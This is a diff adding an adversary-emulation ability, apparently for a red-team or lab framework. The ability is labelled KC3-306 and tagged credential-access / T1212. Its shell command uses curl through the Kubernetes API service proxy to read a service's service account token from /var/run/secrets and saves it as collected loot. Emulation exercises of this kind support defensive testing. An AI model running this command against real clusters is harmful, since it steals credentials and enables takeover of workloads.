@@ -1,0 +1,15 @@
+- id: 30000000-0000-0000-0000-000000000306
+  name: KC3-306 - Path traversal currency service
+  description: Path traversal to currency service with the aim of stealing its ticket.
+  tactic: credential-access
+  technique:
+    attack_id: T1212
+    name: Exploitation for Credential Access
+  repeatable: false
+  singleton: true
+  platforms:
+    linux:
+      sh:
+        command: curl -fsk "https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT/api/v1/namespaces/$NSPROTO/services/currency:8081/proxy/var/run/secrets/kubernetes.io/serviceaccount/token"
+          > $DATA_PATH/KC3/tokenCurrency && test -s $DATA_PATH/KC3/tokenCurrency && grep -Eq '^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$' $DATA_PATH/KC3/tokenCurrency && echo "[KC3-306] currency service token collected in $DATA_PATH/KC3/tokenCurrency"
+        timeout: 30
